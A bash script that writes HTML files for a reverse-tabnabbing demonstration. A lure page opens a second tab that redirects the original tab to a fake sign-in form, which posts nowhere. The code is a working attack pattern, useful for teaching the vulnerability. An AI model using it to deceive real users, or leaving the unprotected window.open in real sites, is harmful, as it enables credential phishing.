#!/bin/bash

# This script generates the HTML files for the tabnabbing demo.

echo "Creating demo files..."

# Create index.html
cat > index.html <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Totally Safe Page</title>
</head>
<body>
    <h1>My Secure Website</h1>
    <p>Click the button below for a special offer!</p>
    <button onclick="openInNewTab()">Click Here for a Prize!</button>
    <script>
        function openInNewTab() {
            window.open('malicious.html');
        }
    </script>
</body>
</html>
EOF

# Create malicious.html
cat > malicious.html <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <title>You Won!</title>
</head>
<body>
    <h1>Congratulations! You've won a prize!</h1>
    <p>Your prize is being processed. Please wait...</p>
    <script>
        window.opener.location = 'phishing.html';
    </script>
</body>
</html>
EOF

# Create phishing.html
cat > phishing.html <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; background-color: #f4f4f4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-container { background-color: #fff; padding: 40px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); width: 320px; text-align: center; }
        .login-container h1 { margin-bottom: 10px; font-size: 24px; color: #333; }
        .login-container p { margin-bottom: 30px; color: #666; }
        .login-container input[type="text"], .login-container input[type="password"] { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
        .login-container input[type="submit"] { width: 100%; padding: 12px; background-color: #007bff; border: none; border-radius: 4px; color: white; font-weight: bold; cursor: pointer; transition: background-color 0.2s; }
        .login-container input[type="submit"]:hover { background-color: #0056b3; }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>Sign in</h1>
        <p>to continue to YourApp</p>
        <form action="#"><input type="text" placeholder="Email or username" required><input type="password" placeholder="Password" required><input type="submit" value="Continue"></form>
    </div>
</body>
</html>
EOF

echo "Setup complete! You can now open index.html to run the demo."
